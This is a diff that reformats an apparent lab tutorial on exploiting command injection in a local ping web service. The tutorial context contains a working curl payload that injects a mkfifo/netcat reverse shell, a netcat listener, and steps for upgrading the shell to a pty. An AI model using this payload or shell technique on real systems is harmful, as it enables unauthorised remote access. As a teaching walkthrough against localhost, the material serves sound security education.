@@ -45,7 +45,7 @@ script.
 Using this service is pretty straightforward, passing it the `host` query
 parameter will execute ping and return its output:
 
-.. code-block:: plain
+.. code-block:: text
 
     % python3 donotrunthis.py &
     [1] 11479
@@ -65,11 +65,11 @@ Open three terminals.
 ---------------------
 
 In one terminal where you don't run a terminal multipler setup your `nc` to
-listen to a port. It is important that you don't run a terminal multiplexer such
-as `screen` or `tmux` because we will be adjusting the terminal settings and
-the mux will interfere.
+listen to a port. It is important that you don't run a terminal multiplexer
+such as `screen` or `tmux` because we will be adjusting the terminal settings
+and the mux will interfere.
 
-.. code-block:: plain
+.. code-block:: text
 
    % nc -lv 4242
    Listening on [0.0.0.0] (family 0, port 4242)
@@ -80,7 +80,7 @@ input/output on a background job can cause the background process to be
 paused.
 
 
-.. code-block:: plain
+.. code-block:: text
 
    & python3 donotrunthis.py
 
@@ -88,7 +88,7 @@ In the last terminal we will run our exploit. `curl` has a handy option of
 escaping the URL parameters for you but you need to pass `-G` to explicitly
 make the request a `GET`.
 
-.. code-block:: plain
+.. code-block:: text
 
     $ curl -Gv --data-urlencode 'host=localhost;rm /tmp/foo; mkfifo /tmp/foo; cat /tmp/foo | /bin/sh -i 2>&1 | nc localhost 4242 > /tmp/foo &' 'http://localhost:8000/'
     *   Trying 127.0.0.1...
@@ -103,18 +103,18 @@ make the request a `GET`.
 This terminal will now hang here as our exploitable application never returns
 any data. However, if we look over at our terminal with `nc` in it:
 
-.. code-block:: plain
+.. code-block:: text
 
     $ nc -lv 4242
     Listening on [0.0.0.0] (family 0, port 4242)
     Connection from localhost 44040 received!
     $
 
-Our command injection has worked and is now connected to our netcat. But  
+Our command injection has worked and is now connected to our netcat. But
 this shell has a few issues! When we run a program and try to `ctrl+c` it our
 netcat program exits. And trying to run `su` yields another error:
 
-.. code-block:: plain
+.. code-block:: text
 
     $ nc -lv 4242
     Listening on [0.0.0.0] (family 0, port 4242)
@@ -127,7 +127,7 @@ The reason of why is not relevant in this article but the gist is that your
 command injection was not allocated a `pty`. We can work around that by
 first gaining a pty using python.
 
-.. code-block:: plain
+.. code-block:: text
 
     $ nc -lv 4242
     Listening on [0.0.0.0] (family 0, port 4242)
@@ -144,8 +144,8 @@ first gaining a pty using python.
 
     su: Authentication failure
 
-Our shell gained a pty and with it a fancy prompt but everything we type is being
-output and sadly using `ctrl+c` still exits our nc. Not the process on the
+Our shell gained a pty and with it a fancy prompt but everything we type is
+being output and sadly using `ctrl+c` still exits our nc. Not the process on the
 remote.
 
 To fix this we're going to tell our own terminal to not interpret any command
@@ -154,7 +154,7 @@ sequences anymore.
 First we `ctrl+z` which moves the current `nc` to the background. We then put
 our own terminal in raw mode using `stty raw -echo`.
 
-.. code-block:: plain
+.. code-block:: text
 
     $ nc -lv 4242
     Listening on [0.0.0.0] (family 0, port 4242)
